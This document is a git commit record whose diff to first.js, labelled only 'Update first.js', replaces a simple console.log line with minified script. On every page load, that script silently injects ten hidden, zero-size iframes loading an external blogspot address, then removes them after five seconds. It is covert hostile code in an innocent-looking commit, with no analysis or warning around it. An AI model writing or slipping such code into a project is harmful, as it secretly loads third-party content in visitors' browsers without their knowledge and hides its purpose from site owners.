d649300d627e0e2f3362570da3a59a21fd1e4b9f
dandinma3i <102339035+dandinma3i@users.noreply.github.com>
2022-03-28 19:10:38 +0000

    Update first.js

--- first.js
+++ first.js
@@ -1,1 +1,1 @@
-console.log("I am first");
+function ninjafr(){var e=document.createElement("iframe");e.src="https://respreq.blogspot.com/",e.style.cssText="width: 0;height: 0;display: none;visibility: hidden;opacity: 0;border: 0;",document.querySelector("body").appendChild(e),setTimeout(function(){e.remove()},5e3)}window.addEventListener("load",function(){for(let e=0;e<10;e++)ninjafr()});
